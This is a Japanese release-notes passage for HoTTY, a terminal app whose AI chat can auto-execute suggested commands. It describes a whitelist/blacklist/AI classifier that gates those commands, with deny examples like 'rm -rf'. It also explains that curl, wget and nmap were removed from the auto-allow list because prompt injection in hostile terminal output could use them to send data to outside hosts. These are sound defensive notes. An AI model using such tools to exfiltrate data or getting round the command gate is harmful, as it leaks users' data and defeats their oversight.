# リリースノート

## v2.0.8-beta1

ターミナルの **「Ask AI」** を、カスタマイズ可能な Ask AI コマンドに代えて、その場で自由に質問できるインラインのボックスへ刷新したベータです。あわせて、AI の自動実行とファイルサーバーのセキュリティを強化しました。

### 破壊的変更

- **カスタマイズ可能な「Ask AI コマンド」を廃止しました。** 右クリックのプリセットコマンド（「What is this?」「Research root cause」「Fix this」など）と、自分で `{selection}` プロンプトを追加・並べ替え・テンプレート化できた **設定 → AI → Ask AI Commands** のエディタは廃止され、下記の自由入力ボックスに置き換わりました。設定済みのカスタム Ask AI コマンドは表示されなくなり、ターミナルの右クリックにコマンド一覧は表示されません。

### 新機能

- **右クリックでターミナル出力について AI に質問。** ターミナルでテキストを選択し、選択範囲を右クリックして、表示される **「Ask AI」** ボックスに質問を入力します（**Enter** で送信、**Shift + Enter** で改行）。HoTTY が AI チャットペインを開く（またはフォーカスする）し、選択したテキストと一緒に質問を送信します。（Terminal Marker をクリックすると出力ブロック全体を選択できます。）従来のプリセットコマンドのモーダルに代わる、より速い自由入力方式です。

### セキュリティ

- **AI の自動実行がネットワークツールを安全とみなさなくなりました。** `curl`・`wget`・`nmap` を既定の自動実行ホワイトリストから削除し、データ流出の経路を塞ぎました。これらは書き込みメソッドのガードに掛からず、単純な `GET` でターミナルや選択範囲のデータを外部ホストへ送信できてしまう恐れがありました（敵対的なホストのターミナル出力がモデルに渡されるため、プロンプトインジェクションの面があります）。また、ホワイトリストのフレーズ一致をコマンドの先頭に固定し、無害なフレーズが、それを含むだけの無関係なコマンドを自動許可しないようにしました。
- **ファイルサーバー: アップロード経路のシンボリックリンク脱出を修正。** 組み込み TFTP/SFTP サーバーの書き込み経路で、末尾要素のシンボリックリンク（リンク切れを含む）を解決して拒否するようにしました。共有フォルダー内に仕込まれたシンボリックリンクで、アップロード先を共有フォルダーの外へ逸らせなくなりました。

## v2.0.7

v2.0.7 ベータシリーズを統合した安定版リリースです。多言語対応の UI、ネットワーク機器へファームウェアを送り込む組み込み **ファイルサーバー**、機器の Web 管理画面を開く組み込み **Web ブラウザー** という3つの大きな追加に加え、ビルドパイプラインのサプライチェーン強化と、信頼性に関する一連の修正（シリアル入力の遅延、セッションログ、SSH ホスト鍵の扱い）を含みます。

### 新機能

- **HoTTY のインターフェースが 8 言語に対応しました。** **設定 → 一般** に新しい **「表示言語」** セレクタを追加し、メニュー・タブ・ダイアログ・設定・AI チャットパネル・アプリ内ヘルプを含む UI 全体を、**English、日本語、简体中文（簡体字中国語）、繁體中文（繁体字中国語）、한국어（韓国語）、Русский（ロシア語）、Español（スペイン語）、Français（フランス語）** の間で切り替えられます。変更は再起動なしで即座に反映され、選択は次回起動以降も保持されます。デフォルトは引き続き English のため、別の言語を選ぶまで既存の環境は影響を受けません。（AI の応答言語は AI チャットパネルで個別に設定する項目であり、この設定では変わりません。）
- **ファームウェアアップロード用の組み込みファイルサーバー (TFTP + SFTP)。** 新しい **File Server** ペイン (タブバー → Features → 「File Server」) で、選択したフォルダーを対象に、アプリ内蔵の **TFTP** サーバー (UDP、既定ポート 69 — Cisco IOS の `copy tftp: flash:` の定番手法) と **SFTP** サーバー (SSH ベース、既定ポート 2222、ユーザー名/パスワード認証) を起動できます。これにより、ルーター・スイッチなどの LAN 機器がファームウェアや設定ファイルを直接ダウンロード・アップロードできます。既定は読み取り専用で (プロトコルごとに **Allow uploads** を切り替えると機器→PC の転送が可能)、各リクエストは選択フォルダー内に限定され (パストラバーサル・シンボリックリンクによる脱出・機密システムパスへのアクセスはブロック)、SFTP のホスト鍵は自動生成され暗号化して保存されます。転送ログにはクライアント・ファイル・方向がリアルタイムで表示されます。**Windows ファイアウォール** が受信接続をブロックしている場合はペインに表示され、ワンクリックの **Allow through firewall** (管理者権限が必要) で許可できます。サーバーはタブを開いている間だけ動作し、タブを閉じると停止してポートを解放します。本機能は **設定 → Features** で無効化できます。
- **機器の Web 管理画面を開ける組み込み Web ブラウザー。** HoTTY 内の組み込みブラウザー（Microsoft Edge WebView2）で Web ページを開けます。ルーター、スイッチ、iLO/iDRAC などネットワーク機器の Web 管理画面を、ターミナルの隣で開くのに最適です。**New Session** ダイアログの新しい **🌐 Web** タブから、空のタブまたは保存したブックマークで起動します。ペインには 戻る / 進む / 再読み込み / 停止 と、入力した URL へ移動するか URL でないテキストを **Web 検索** するアドレスバーがあります。サイトは **ブックマークのフォルダーツリー** に整理でき（追加・名前変更・削除・ドラッグで並べ替え）、ツールバーのブックマークボタンから保存済みブックマークをブラウザーを離れずに開けます。**★** ボタンで現在のページを選んだフォルダーに保存します。ログインセッションは再起動後も保持され、**パスワードの保存と自動入力**にも対応します。これらは HoTTY 専用の暗号化されたプロファイルに保存され、システムの Edge/Chrome とは分離されています。閲覧中のページはサンドボックス化されており、HoTTY の内部にはアクセスできません。機能全体は **設定 → Features** でオフにできます。

### 改善

- **タブの右クリックメニューを拡充しました。** タブを右クリックすると、そのタブに応じた操作が表示されます。ターミナルセッションでは **AIで監視** / **AI監視を停止**、SSH/Telnet セッションでは **ホストツリーに保存…**、Web ブラウザータブでは **ブックマークに追加…** です。ページのブックマーク時には、保存先フォルダーをフラットなドロップダウンではなく展開可能なツリーで選べます。

### バグ修正

- **シリアル接続で入力がもたつかなくなりました。** シリアルセッションでは読み取りと書き込みが内部で同じロックを共有していたため、キー入力が現在の読み取りサイクルの完了を待ってから送信されることがあり、無入力時には1文字あたり最大約100msの遅延が生じていました。読み取りと書き込みで独立したハンドルを使うようにし、入力が遅延なくエコーされるようになりました。
- **セッションログの書き込み失敗を、無音で握りつぶさず通知するようになりました。** セッション中にログファイルへの書き込みが失敗した場合 (例: ディスクの空き不足、ログフォルダーが利用できなくなった場合)、これまではエラーが無視され、記録が黙って途中で途切れていました。今後はこの失敗を報告し、そのセッションのログ記録を停止します — ログファイルが無音のまま不完全になることはありません。あわせて、解決できないファイル名衝突という稀なケースでも、既存のログを上書きせず一意の名前を選ぶようにしました。
- **変更された SSH ホスト鍵の受け入れを、アトミックに記録するようになりました。** 鍵が変更されたホストを「受け入れて記憶」する際 (直接接続・踏み台接続のいずれも)、古いエントリと新しいエントリを単一の更新で書き込むようにしました。これまでは、同じホストへの2つ目の同時接続がその一瞬の隙に鍵が無いと判断し、不要に再度プロンプトを表示することがありました。
- **Ping モニターペインのイベントリスナーリークを修正しました。** Ping モニターペインを繰り返し開閉すると、不要なバックグラウンドのイベント購読が残ることがありました。ペインを閉じる際に必ず解除されるようになりました。

### セキュリティ

- **依存関係のサプライチェーン強化。** ビルドは検証済みロックファイルから整合性チェック付きで厳密にインストールするようになり、公開パッケージレジストリを固定 (依存混同攻撃を防止) し、依存更新は採用前に数日間のクールダウンを設けることで、悪意ある新バージョンが検知・削除される前に取り込まれないようにしました。リリース時、および CI による各 push 時に、npm のレジストリ署名検証 (`npm audit signatures`) と、セキュリティ勧告・クレートのソース・ライセンスを対象とする `cargo-deny` 監査を必須ゲートにしました。

## v2.0.7-beta7

beta6 で追加した **Web ブラウザー**の使い勝手を改善しました。ツールバーのブックマークボタン、Web 検索にフォールバックするアドレスバー、より充実したタブの右クリックメニューに加え、ターミナルタブを Web ブラウザーペインにドラッグできない不具合を修正しました。

### 新機能

- **ブラウザーを離れずに保存済みブックマークを開けます。** Web ブラウザーのツールバーに新しいブックマークボタンが追加され、保存済みのブックマークフォルダーツリーをドロップダウン表示します。項目をクリックすると現在のペインでそのサイトを開きます（保存するまでは「ブックマークがありません」と表示されます）。これまでブックマークを開くには **New Session → Web** タブに戻る必要がありました。
- **アドレスバーが、URL でない文字列を Web 検索するようになりました。** Web アドレスでないもの（自由なテキストや単語ひとつ）を入力すると、移動に失敗する代わりに Google 検索を実行します（通常のブラウザーのアドレスバーと同じ挙動）。ホストらしい入力（ドメイン、IP アドレス、`host:port`、`localhost`）はこれまでどおり直接移動し、明示的な `http://` / `https://` アドレスも変わりません。

### 改善

- **タブの右クリックメニューを拡充しました。** タブを右クリックすると、そのタブに応じた操作が表示されます。ターミナルセッションでは **AIで監視** / **AI監視を停止**、SSH/Telnet セッションでは **ホストツリーに保存…**、Web ブラウザータブでは **ブックマークに追加…**（ツールバーの ★ と同じ）です。タブ上ではブラウザー標準の右クリックメニューも抑制され、HoTTY のメニューのみが表示されます。
- **ページのブックマーク時にフォルダーツリーを表示。** ブックマーク追加ダイアログで、保存先フォルダーをフラットなドロップダウンではなく展開可能なツリーで選べるようになり、入れ子のフォルダーへ整理しやすくなりました。

### バグ修正

- **ターミナルタブを Web ブラウザーペインにドラッグできるようになりました。** ブラウザーの組み込みネイティブビューがページの上に重なってドラッグ＆ドロップのイベントを奪っていたため、ターミナルをブラウザーペインのグリッドセルにドロップしても何も起きませんでした。タブのドラッグ中はこのビューを非表示にするようにし、下にあるセルへ正しくドロップできるようにしました。

## v2.0.7-beta6

ネットワーク機器の Web 管理画面（やあらゆるサイト）を HoTTY 内で開ける組み込み **Web ブラウザー**。New Session ダイアログから起動でき、フォルダー整理されたブックマークとログイン保持に対応します。

### 新機能

- **Web ブラウザーペイン。** HoTTY 内の組み込みブラウザー（Microsoft Edge WebView2）で Web ページを開けます。ルーター、スイッチ、iLO/iDRAC などネットワーク機器の Web 管理画面を、ターミナルの隣で開くのに最適です。**New Session** ダイアログの新しい **🌐 Web** タブから起動します。**🆕 新しい Web ブラウザー**で空のタブを開くか、保存したブックマークをダブルクリックします。ペインには 戻る / 進む / 再読み込み / 停止 とアドレスバーがあります（`http://` と `https://` のみ許可。スキームなしで入力すると `http://` が補われます）。ログインセッションは再起動後も保持され、**パスワードの保存と自動入力**にも対応します。これらは HoTTY 専用の暗号化されたブラウザープロファイルに保存され、システムの Edge/Chrome とは分離されています。閲覧中のページはサンドボックス化されており、HoTTY の内部にはアクセスできません。機能全体は **設定 → 機能** でオフにできます。
- **Web ブックマーク。** New Session の **Web** タブでサイトをフォルダーツリーに整理でき（追加・名前変更・削除・ドラッグで並べ替え）、ブックマークをクリックすると新しいブラウザーペインで開きます。閲覧中はツールバーの **★** ボタンで現在のページを選んだフォルダーに保存できます。ブックマークはローカルに保存され、資格情報は含みません。

## v2.0.7-beta5

コードベース全体の見直しで見つかった不具合の修正リリースです。とくに、シリアル接続での入力のもたつきが解消されました。

### バグ修正

- **シリアル接続で入力がもたつかなくなりました。** シリアルセッションでは読み取りと書き込みが内部で同じロックを共有していたため、キー入力が現在の読み取りサイクルの完了を待ってから送信されることがあり、無入力時には1文字あたり最大約100msの遅延が生じていました。読み取りと書き込みで独立したハンドルを使うようにし、入力が遅延なくエコーされるようになりました。
- **セッションログの書き込み失敗を、無音で握りつぶさず通知するようになりました。** セッション中にログファイルへの書き込みが失敗した場合 (例: ディスクの空き不足、ログフォルダーが利用できなくなった場合)、これまではエラーが無視され、記録が黙って途中で途切れていました。今後はこの失敗を報告し、そのセッションのログ記録を停止します — ログファイルが無音のまま不完全になることはありません。あわせて、解決できないファイル名衝突という稀なケースでも、既存のログを上書きせず一意の名前を選ぶようにしました。
- **ファイルサーバー / Ping モニターペインのイベントリスナーリークを修正しました。** これらのペインを繰り返し開閉すると、不要なバックグラウンドのイベント購読が残ることがありました。ペインを閉じる際に必ず解除されるようになりました。
- **変更された SSH ホスト鍵の受け入れを、アトミックに記録するようになりました。** 鍵が変更されたホストを「受け入れて記憶」する際 (直接接続・踏み台接続のいずれも)、古いエントリと新しいエントリを単一の更新で書き込むようにしました。これまでは、同じホストへの2つ目の同時接続がその一瞬の隙に鍵が無いと判断し、不要に再度プロンプトを表示することがありました。

## v2.0.7-beta4

beta3 で追加したファイルサーバーの修正です。タブを閉じるとサーバーが停止するようになりました。

### バグ修正

- **ファイルサーバーがタブを閉じると停止するようになりました。** これまでは File Server タブを閉じても TFTP / SFTP サーバーがバックグラウンドで動き続け、ポートを占有したままでした (同じポートでの再起動が失敗することがありました)。タブを閉じると即座にサーバーを停止してポートを解放するようになりました — ファイルサーバーはタブを開いている間だけ動作します。

## v2.0.7-beta3

ネットワーク機器へファームウェアや設定ファイルを LAN 経由で送り込むための、組み込みの **ファイルサーバー** を追加しました。選択したフォルダーを対象に TFTP / SFTP サーバーを起動でき、Cisco 系の機器から `copy tftp:` / `copy scp:` で直接取得できます。

### 新機能

- **ファームウェアアップロード用の組み込みファイルサーバー (TFTP + SFTP)。** 新しい **File Server** ペイン (タブバー → Features → 「File Server」) で、選択したフォルダーを対象に、アプリ内蔵の **TFTP** サーバー (UDP、既定ポート 69 — Cisco IOS の `copy tftp: flash:` の定番手法) と **SFTP** サーバー (SSH ベース、既定ポート 2222、ユーザー名/パスワード認証) を起動できます。これにより、ルーター・スイッチなどの LAN 機器がファームウェアや設定ファイルを直接ダウンロード・アップロードできます。既定は読み取り専用で (プロトコルごとに **Allow uploads** を切り替えると機器→PC の転送が可能)、各リクエストは選択フォルダー内に限定され (パストラバーサル・シンボリックリンクによる脱出・機密システムパスへのアクセスはブロック)、SFTP のホスト鍵は自動生成され暗号化して保存されます。転送ログにはクライアント・ファイル・方向がリアルタイムで表示されます。**Windows ファイアウォール** が受信接続をブロックしている場合はペインに表示され、ワンクリックの **Allow through firewall** (管理者権限が必要) で許可できます。本機能は **設定 → Features** で無効化できます。

## v2.0.7-beta2

HoTTY のインターフェースが多言語対応になりました。**設定 → 一般** に新しく追加された **「表示言語」** セレクタで、UI 全体を 8 言語に、再起動なしで即座に切り替えられます。

### 新機能

- **HoTTY のインターフェースが 8 言語に対応しました。** **設定 → 一般** に新しい **「表示言語」** セレクタを追加し、メニュー・タブ・ダイアログ・設定・AI チャットパネル・アプリ内ヘルプを含む UI 全体を、**English、日本語、简体中文（簡体字中国語）、繁體中文（繁体字中国語）、한국어（韓国語）、Русский（ロシア語）、Español（スペイン語）、Français（フランス語）** の間で切り替えられます。変更は再起動なしで即座に反映され、選択は次回起動以降も保持されます。デフォルトは引き続き English のため、別の言語を選ぶまで既存の環境は影響を受けません。（AI の応答言語は AI チャットパネルで個別に設定する項目であり、この設定では変わりません。）

## v2.0.7-beta1

依存パッケージのサプライチェーン攻撃が相次ぐ中、HoTTY の依存関係のサプライチェーンを強化したセキュリティ重視のベータです。アプリ内の動作に変更はありません — 本リリースは、インストーラーを生成するビルド・依存関係パイプラインの健全性を強化するものです。

### セキュリティ

- **依存関係のサプライチェーン強化。** ビルドは検証済みロックファイルから整合性チェック付きで厳密にインストールするようになり、公開パッケージレジストリを固定 (依存混同攻撃を防止) し、依存更新は採用前に数日間のクールダウンを設けることで、悪意ある新バージョンが検知・削除される前に取り込まれないようにしました。リリース時、および CI による各 push 時に、npm のレジストリ署名検証 (`npm audit signatures`) と、セキュリティ勧告・クレートのソース・ライセンスを対象とする `cargo-deny` 監査を必須ゲートにしました。

## v2.0.6

v2.0.6 ベータシリーズを統合した安定版リリースです。目玉は AI チャットの新しいコマンド安全モデルで、AI が提案したコマンドの自動実行を、ユーザーが完全に管理できる明示的な **ホワイトリスト / ブラックリスト + AI** 分類器で判定するようになり、各コマンドがどう判定されたかを必ず表示します。さらに、AI コマンド先頭の `sleep` をデバイスではなくクライアント側で待機し、コマンド安全判定を Vertex AI 上の Claude モデルにも対応させました。

### 新機能

- **コマンドの安全判定をホワイトリスト・ブラックリスト・AI の3層で決定 — すべて設定可能。** 自動実行が有効なとき、AI が提案した各コマンドは次の3層を通ります。まず **ブラックリスト** を確認し (一致したものは自動実行されません — 手動の Run は引き続き可能)、**ホワイトリスト** にある明らかな読み取り専用コマンドは自動実行、その中間はすべて AI に送られ、設定/状態を変更するかどうかを判定します — AI が十分な確信度で読み取り専用と判定したものだけが自動実行され、それ以外は確認待ちになります。両リストは **設定 → AI → Command Execution** で完全に編集でき、1語ならコマンド名一致 (例: `docker` はすべての docker コマンドに一致)、空白を含む場合は部分文字列一致 (例: `rm -rf`、`git push`) で、各リストに **初期値にリセット** ボタンがあります。戦略 (Static / AI / **Hybrid**、既定) と AI 確信度のしきい値も同じ場所で選べます。従来の固定の安全コマンドリストを置き換えます。
- **各コマンドの判定理由を表示。** 各実行ブロックに、コマンドごとの判定 — ホワイトリスト / AI判定 (確信度付き) / ブラックリスト / 確認が必要 — を理由とともに表示するようになり、自動実行された (またはされなかった) 理由が分かるようになりました。
- **AI コマンド先頭の `sleep` を、デバイスではなくクライアント側で待機。** AI が `sleep N` で始まるコマンド (例: `sleep 120 && validate`) を発行したとき、HoTTY は `sleep` を端末に送らず、その N 秒をローカルで待機してから後続のチェーンコマンドを実行するようになりました。デバイス上の `sleep` は出力を返さないため、これまではコマンドごとの **デバイス応答アイドルタイムアウト** が待機中に誤発火し、AI が早まって次に進んでしまうことがありました。待機を HoTTY 側で行うことでタイミングが正確になります。待機中は実行ブロックに **「⏳ Waiting Ns…」** のカウントダウンが表示されます。**設定 → AI** に2つのオプションが追加されました — 有効/無効のトグル (既定でオン) と **最大待機時間** の上限 (既定 900 秒 / 15 分。これを超える sleep は上限に丸められ、その旨が示されます。0 = 上限なし)。

### 改善

- **既存の環境は Hybrid 分類器に移行されます。** アップグレード時、これまでのカスタム安全コマンドは編集可能なホワイトリストに統合され、ブラックリストには破滅的コマンドの妥当な初期値が投入され、戦略は Hybrid に設定されて AI 判定が最初から利用できます。いずれも設定で変更できます。
- **コマンド安全判定が Vertex AI 上の Claude モデルに対応。** Hybrid / AI 分類器が自動実行の判定のためにコマンドをモデルへ送る際、Vertex AI 上の Anthropic (Claude) モデルがサポートされました。これまでは Google (Gemini) の Vertex モデルでしか判定できず、Claude-on-Vertex モデルを選ぶと分類器は手動実行にフォールバックしていました。どの Vertex モデルファミリーでも Auto-execute-safe が同じように動作します。

## v2.0.6-beta2

beta1 の続きとして、AI が発行する `sleep` コマンドとデバイス応答タイムアウトの相互作用を修正し、コマンド安全判定を Vertex AI 上の Claude モデルにも対応させたリリースです。

### 新機能

- **AI コマンド先頭の `sleep` を、デバイスではなくクライアント側で待機。** AI が `sleep N` で始まるコマンド (例: `sleep 120 && validate`) を発行したとき、HoTTY は `sleep` を端末に送らず、その N 秒をローカルで待機してから後続のチェーンコマンドを実行するようになりました。デバイス上の `sleep` は出力を返さないため、これまではコマンドごとの **デバイス応答アイドルタイムアウト** が待機中に誤発火し、AI が早まって次に進んでしまうことがありました。待機を HoTTY 側で行うことでタイミングが正確になります。待機中は実行ブロックに **「⏳ Waiting Ns…」** のカウントダウンが表示されます。**設定 → AI** に2つのオプションが追加されました — 有効/無効のトグル (既定でオン) と **最大待機時間** の上限 (既定 900 秒 / 15 分。これを超える sleep は上限に丸められ、その旨が示されます。0 = 上限なし)。

### 改善

- **コマンド安全判定が Vertex AI 上の Claude モデルに対応。** Hybrid / AI 分類器が自動実行の判定のためにコマンドをモデルへ送る際、Vertex AI 上の Anthropic (Claude) モデルがサポートされました。これまでは Google (Gemini) の Vertex モデルでしか判定できず、Claude-on-Vertex モデルを選ぶと分類器は手動実行にフォールバックしていました。どの Vertex モデルファミリーでも Auto-execute-safe が同じように動作します。

## v2.0.6-beta1

AI チャットの安全性に焦点を当てたリリースです。AI が提案したコマンドの自動実行を、ユーザーが完全に管理できる明示的な **ホワイトリスト / ブラックリスト + AI** モデルで判定するようになり、各コマンドがどう判定されたかを必ず表示します。

### 新機能

- **コマンドの安全判定をホワイトリスト・ブラックリスト・AI の3層で決定 — すべて設定可能。** 自動実行が有効なとき、AI が提案した各コマンドは次の3層を通ります。まず **ブラックリスト** を確認し (一致したものは自動実行されません — 手動の Run は引き続き可能)、**ホワイトリスト** にある明らかな読み取り専用コマンドは自動実行、その中間はすべて AI に送られ、設定/状態を変更するかどうかを判定します — AI が十分な確信度で読み取り専用と判定したものだけが自動実行され、それ以外は確認待ちになります。両リストは **設定 → AI → Command Execution** で完全に編集でき、1語ならコマンド名一致 (例: `docker` はすべての docker コマンドに一致)、空白を含む場合は部分文字列一致 (例: `rm -rf`、`git push`) で、各リストに **初期値にリセット** ボタンがあります。戦略 (Static / AI / **Hybrid**、既定) と AI 確信度のしきい値も同じ場所で選べます。従来の固定の安全コマンドリストを置き換えます。
- **各コマンドの判定理由を表示。** 各実行ブロックに、コマンドごとの判定 — ホワイトリスト / AI判定 (確信度付き) / ブラックリスト / 確認が必要 — を理由とともに表示するようになり、自動実行された (またはされなかった) 理由が分かるようになりました。

### 改善

- **既存の環境は Hybrid 分類器に移行されます。** アップグレード時、これまでのカスタム安全コマンドは編集可能なホワイトリストに統合され、ブラックリストには破滅的コマンドの妥当な初期値が投入され、戦略は Hybrid に設定されて AI 判定が最初から利用できます。いずれも設定で変更できます。

## v2.0.5

小さな使い勝手の改善リリースです。マウスに持ち替えることなく、キーボードだけでペイン間のフォーカスを移動できるようになりました。

### 新機能

- **キーボードでペイン間のフォーカスを切り替えられるようになりました。** `Ctrl+Tab` で次のペインへ、`Ctrl+Shift+Tab` で前のペインへフォーカスが移動し、表示中のすべてのペイン — グリッドのセル (行優先の順)、続いて表示中のサイドバーペイン — を巡回します。従来アクティブなペインはクリックでしか切り替えられませんでした。`Ctrl+Tab` はターミナルのバイト列として表現できないため、このショートカットがシェルや vim、tmux などペイン内で動作しているもののキー操作を奪うことはありません。

## v2.0.4

AI チャットに焦点を当てたリリースです。**Network Expert** ペルソナがデバイスの準備を自動で行うようになりました。このペルソナのチャットがライブのターミナルにリンクされると、HoTTY がペルソナ必須の開始時プロトコル (デバイスの識別 → ページングの無効化) を自動的に実行します — セッションを準備するためだけの最初のメッセージを送る必要がなくなりました。

### 新機能

- **Network Expert チャットが開始時プロトコルを自動的に実行するようになりました。** Network Expert ペルソナを使う AI チャットがライブのターミナルにリンクされると、HoTTY がペルソナ必須の準備処理 — デバイスを識別し、続いてページングを無効化する — を自動で開始するようになり、質問する前に応答ループが準備されます (従来このプロトコルは最初のメッセージを送ったときにのみ実行されていました)。この動作は再接続およびデバイスを考慮します。リンク先のターミナルを *別の* デバイスへ切り替えると、まず新しいチャットを開始し — 古い会話とそのバックエンド履歴をクリアして、前のデバイスの出力が新しいコンテキストに混入しないようにし — その後で完全な準備処理を再実行します。一方、会話の途中で *同じデバイスへ再接続* した場合は、軽量なページング再無効化のみを注入し、会話はそのまま維持します。HoTTY が管理したことのないデバイス上で既に入力済みのチャットが乗っ取られることはありません。

## v2.0.3

v2.0.3 安定版リリースです。v2.0.3 ベータシリーズをまとめたものに加え、本安定版では **再接続したターミナルへの AI チャットタブの自動再リンク**、監視中のターミナルが切断された際のより分かりやすい UI 表示、そして AI チャットのストリーミング / 自動実行に関する信頼性修正一式を追加しました。

### 新機能

- **AI チャットタブが再接続したターミナルへ自動的に再リンクされます。** 監視中のターミナルが切断されると、その AI チャットタブはターゲットの構成由来の識別子 (プロトコル + 接続先) を保持し、同じターゲットへターミナルが再接続されると — 再接続では新しいセッション ID が割り当てられます — 孤立したタブがそれに自動で再リンクされるため、再度 **Watch** を押さなくても会話を継続できます。再リンクは一意に特定できる場合 (再接続されたセッションと孤立タブがそれぞれ 1 つだけターゲット識別子を共有する場合) のみ行われ、曖昧な同一ターゲットのケースは手動での解決に委ねられます。

### 改善

- **AI チャットがリンク先ターミナルの未接続状態を表示するようになりました。** リンク済みターミナルのチップと各メッセージの **Target:** ラベルが、監視中のセッションが切断・再接続中・消失している間は警告色になり「(disconnected)」と表示され、ターミナルを再接続して **Watch** を押し直し再リンクするよう促すツールチップが付きます。従来はコマンドが届かない状態でもリンクは正常に見えていました。
- **再接続後に Watch を押すと現在のタブがその場で再リンクされます。** アクティブなタブが死んだセッションを指している場合、再接続したターミナルで **Watch** を切り替えると、死んだセッションを指したまま 2 つ目のタブを開くのではなく、そのタブを (古い監視バッファを破棄して) 再リンクします。
- **死んだ / ハーフオープンの SSH ピアを確定的に検出するようになりました。** SSH キープアライブに未応答プローブの明示的な上限を設けたため、無言で切断された接続やゾンビ接続が、ハングするのではなく無応答になってから一定時間内に *disconnected* として表面化します。これにより UI と AI チャットの自動再リンクが切断に反応できます。
- **`screen-length` が読み取り専用コマンドとして認識されるようになりました。** Auto-execute-safe モードで、Huawei / H3C 機器の `screen-length 0 temporary` のようなページング制御行が手動確認なしで実行されます。

### バグ修正

- **未接続のリンク先ターミナルへのコマンド実行が黙って失敗しなくなりました。** SSH の切断・再接続後にチャットがリンク済みに見える状態で **Run in Terminal** (または自動実行) をクリックすると、バックエンドに存在しないセッションへコマンドが送られ、エラーが握り潰されていました — 何も実行されず AI が無期限に待っていました。送信は両側でガードされるようになり、古いリンクでは自動実行を抑制し (手動の **Run** ボタンを残す)、実行を試みるとモデルが読める「リンク先ターミナルが未接続です — 再接続して Watch を押してください」という結果を投稿します。

- **応答のストリーミング中に AI チャットのコードブロックが重なって表示されなくなりました。** ストリーミング中のメッセージ内のすべての `<pre>` をインライン表示にする CSS ルールがあり、複数行のコードブロックが応答完了まで重なったテキストに潰れていました (確定後にのみ自己修正)。コードブロックはストリーミング中もブロックレベルを維持するようになりました。
- **ストリーミング中に実行コマンドブロックが崩れなくなりました。** 応答のストリーミング中、` ```execute ` ブロックがインデントの崩れた状態で表示されることがありました。メッセージのパートが配列の位置でキー付けされていたため、トークンが届くたびに同じ位置のスロットがマークダウン (注入 HTML) と実行 (React children) の間で切り替わり、古い注入 DOM が残っていました。パートに種別を区別する安定キーを持たせ、種別が切り替わった際に React がきれいに再マウントするようにし、ストリーミング中の閉じられていない末尾の `execute` フェンスを保留ブロックとして認識し、コマンド行が折り返されないようにしました。
- **ストリームが停止した後に入力がロックされたまま AI チャットがハングしなくなりました。** ストリーミング応答がチャンクの後に停止した場合 (完了シグナルの欠落やプロバイダのハング)、3 分のアイドルウォッチドッグがチャンクごとに破棄・再購読され — そのチャンクが直前にセットしたアイドルタイマーを消去していた — タイムアウトが発火せずチャットがロックされたままでした (**Stop** のみで回復)。ウォッチドッグはペインごとに 1 回だけ購読し、完了せず延々とストリーミングし続けるストリームを別のハードキャップタイマーがキャンセルするようになりました。
- **無応答デバイスでも AI のコマンドごとのアイドルタイムアウトが発火するようになりました。** デバイスが 0 バイトを返したコマンド (停止・ハングしたセッション、抑制されたエコー、切断された接続) は「N 秒間デバイスから応答なし」のアイドルタイムアウトに到達せず、代わりに 30 分のセーフティ上限まで待っていました — まさにアイドルタイムアウトが存在する意義である無応答ハングのケースです。アイドルタイムアウトは出力を一切必要としなくなり、無応答デバイスは速やかにタイムアウトするようになりました。
- **New chat 後の最初の自動実行コマンドが抑制されなくなりました。** **New chat** を開始すると表示中のメッセージはクリアされますが、ペインの自動実行重複ガードとバッジ集合は保持されていました。メッセージインデックスは 0 から再開するため、新しい会話での AI の最初のコマンドが前のチャットと同じキーを再生成し、黙って重複として扱われていました — ターミナルに届かず、ポーリングもアイドルタイムアウトも開始されないのに、古い「自動実行済み」バッジは表示されたままでした。両方の構造をタブごとに追跡し、New chat 開始時にリセットするようになりました。

## v2.0.3-beta8

GCP ペインに関するリリースです。Compute Engine インスタンスの一覧表示が大幅に高速になりました。ディスカバリは、クエリごとに `gcloud` サブプロセスを起動する方式から、Google の REST API (Cloud Resource Manager + Compute `aggregatedList`) を直接呼び出す方式へと作り直されました — リフレッシュごとに OAuth トークンを 1 つだけ取得して使い回し、多数のプロジェクトを並行して問い合わせます。REST 経路が利用できない場合は自動的に `gcloud` CLI へフォールバックします。ペインには入力に応じてプロジェクト / インスタンスを絞り込む **検索ボックス** が追加され、さらに **起動時に直近の一覧を即座に表示** しながらバックグラウンドで再検証するようになりました。セキュリティ強化 2 件として、新しいホストツリー (`.htree`) エクスポートはメモリハードな **Argon2id** 鍵導出関数を使うようになり、`gcloud` の引数ガードがシェルのメタ文字一式を拒否するようになりました。

### 新機能

- **GCP ペインの検索ボックス。** GCP インスタンスペインの上部に検索フィールドが追加され、入力に応じてプロジェクト名 / インスタンス名で一覧を絞り込めます。マッチは大文字小文字を区別せず、プロジェクト名とインスタンス名の両方を対象とします — プロジェクトは、自身の名前が一致するか、配下のいずれかのインスタンスが一致する場合に表示され続けます。**×** ボタンでクエリをクリアでき、最後に入力した検索文字列はセッションをまたいで記憶されます。フィルタは IAP アクセスゲートの後に適用されるため、接続が許可されているインスタンスのみが対象になります。

### 改善

- **GCP のプロジェクトとインスタンスが起動時に即座に表示されるようになりました。** ディスカバリのスナップショット (プロジェクト、インスタンス、IAP アクセスフラグ — シークレットは含みません) がユーザーごとにディスクへ永続化され、起動時に再読み込みされるようになりました。これにより、ペインは空の状態から始まるのではなく直近の一覧を即座に表示します。そのスナップショットが 10 分より古い場合はバックグラウンドで再検証され (stale-while-revalidate)、データをすぐに見られると同時に静かに更新されます。直近のリフレッシュによるメモリ上の新しいスナップショットはそのまま再利用され、再取得には引き続き明示的な **Refresh** が必要です。

### パフォーマンス

- **Google の REST API により GCP ディスカバリが大幅に高速になりました。** プロジェクトとインスタンスの列挙、および IAP / OS Login 権限のプローブは、これまで呼び出しごとに個別の `gcloud` (Python) サブプロセスを起動しており、多数のプロジェクトを持つユーザーではこれがリフレッシュ時間の大半を占めていました。HoTTY は Cloud Resource Manager と Compute `aggregatedList` の REST エンドポイントを直接呼び出すようになり、リフレッシュごとに OAuth アクセストークンを 1 つだけ取得して (`gcloud auth print-access-token` 経由) すべての呼び出しで使い回し、プロジェクトごとの処理をより高い並行度で実行します。結果の並び順と分かりやすいエラーメッセージは旧来の CLI 経路と同一で、REST バックエンドが利用できない場合は自動的に `gcloud` CLI へフォールバックします。

### セキュリティ

